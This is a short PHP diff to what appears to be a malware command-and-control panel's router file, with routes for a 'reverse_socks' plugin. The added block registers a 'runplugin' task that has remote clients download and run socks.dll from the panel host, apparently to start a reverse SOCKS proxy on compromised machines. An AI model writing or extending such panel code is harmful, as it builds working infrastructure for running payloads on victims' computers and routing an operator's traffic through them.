@@ -12,4 +12,10 @@ $router->all('/reverse_socks', 'reverse_socks@dashboard');
 $router->all('/reverse_socks_controll', 'reverse_socks@reverse_socks_controll');
 
 
+$GLOBALS["task_configuration"][$pluginName] = array(
+    "name" => "Start Reveres Socks Server",
+    "command" => "runplugin",
+    "value" => $host."/versions/".$GLOBALS["loadedVersion"]."/plugins/".$pluginName."/dll/socks.dll;socks;127.0.0.1"
+);
+
 
